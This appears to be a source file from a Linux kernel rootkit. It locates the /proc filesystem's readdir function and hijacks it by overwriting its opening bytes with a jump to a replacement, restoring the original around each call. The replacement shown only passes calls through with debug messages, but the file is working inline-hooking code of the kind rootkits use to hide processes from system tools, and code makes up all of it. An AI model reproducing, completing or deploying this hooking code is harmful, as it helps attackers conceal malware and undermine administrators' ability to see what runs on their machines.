#include <linux/unistd.h>
#include <linux/types.h>
#include <linux/kernel.h>

#include "common.h"
#include "readdirHijack.h"

//void (*readdir_ptr)(long) = (void (*)(long)) readdir;
int (*readdir_ptr)(struct file *file, void *dirent, filldir_t filldir);
char readdirHijackBytes[NUM_HIJACK_BYTES];
char readdirOriginalBytes[NUM_HIJACK_BYTES];

// Taken from: http://www.poppopret.org/?p=251
void *get_vfs_readdir ( const char *path )
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->readdir;

    filp_close(filep, 0);

    return ret;
}

int replacement_readdir(struct file *file, void *dirent, filldir_t filldir) {
   int returnValue;
   printInfo("Writing original bytes\n");
   writeHijackBytes(readdir_ptr, readdirOriginalBytes, NULL);
   printInfo("Calling original function\n");
   returnValue = readdir_ptr(file, dirent, filldir);
   printInfo("Writing back hijack function\n");
   writeHijackBytes(readdir_ptr, readdirHijackBytes, NULL);
   printInfo("Replacement completed successfully\n");
   return returnValue;
}

void hijack_readdir() {
   printInfo("Finding proc readdir\n");
   readdir_ptr = get_vfs_readdir("/proc");
   printInfo("Getting hijack bytes\n");
   getHijackBytes(replacement_readdir, readdirHijackBytes);
   printInfo("Hijacking function\n");
   writeHijackBytes(readdir_ptr, readdirHijackBytes, readdirOriginalBytes);
   printInfo("Hijack successful\n");
}

void unhijack_readdir() {
   writeHijackBytes(readdir_ptr, readdirOriginalBytes, NULL);
   printInfo("Unhijacked\n");
}
